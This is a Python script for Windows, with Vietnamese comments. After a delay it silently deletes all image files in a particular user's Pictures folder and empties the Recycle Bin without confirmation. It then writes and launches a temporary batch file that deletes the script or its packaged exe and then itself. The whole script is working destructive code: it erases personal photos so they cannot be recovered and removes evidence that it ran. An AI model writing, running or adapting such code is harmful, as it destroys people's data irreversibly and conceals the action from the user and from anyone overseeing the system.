import os
import time
import ctypes
import sys
import tempfile

time.sleep(10)

# ===  XÓA ẢNH TRONG THƯ MỤC CỤ THỂ ===
pictures_dir = r"C:\Users\Mrgoat\Pictures"
extensions = ['.jpg', '.jpeg', '.png', '.gif', '.jfif', '.bmp', '.webp']
deleted = []

try:
    if os.path.exists(pictures_dir):
        for filename in os.listdir(pictures_dir):
            filepath = os.path.join(pictures_dir, filename)
            if os.path.isfile(filepath) and any(filename.lower().endswith(ext) for ext in extensions):
                os.remove(filepath)
                deleted.append(filename)
                print(f" Đã xóa: {filename}")
    else:
        print(" Thư mục không tồn tại:", pictures_dir)
except Exception as e:
    print(f" Lỗi khi xóa ảnh: {e}")

if not deleted:
    print(" Không có ảnh nào bị xóa.")

# === DỌN SẠCH THÙNG RÁC ===
try:
    ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x00000007)
    print(" Đã dọn sạch thùng rác.")
except Exception as e:
    print(f" Không thể dọn thùng rác: {e}")

# === TỰ XÓA FILE .py HOẶC .exe ===

try:
    if getattr(sys, 'frozen', False):  # nếu là exe đóng gói bằng PyInstaller
        this_path = sys.executable
    else:  # nếu chạy bằng python script
        this_path = os.path.abspath(__file__)
except Exception as e:
    print(f" Không xác định được đường dẫn file: {e}")
    this_path = None

# Tạo file .bat để tự xóa
if this_path and os.path.exists(this_path):
    try:
        bat_code = f"""
@echo off
timeout /t 2 > nul
del "{this_path}" > nul 2>&1
del "%~f0"
"""
        bat_path = os.path.join(tempfile.gettempdir(), "autodelete.bat")
        with open(bat_path, "w") as bat:
            bat.write(bat_code)
        os.system(f'start "" "{bat_path}"')
        print(" File chính sẽ tự xóa sau vài giây.")
    except Exception as e:
        print(f" Không thể tạo script tự xóa: {e}")
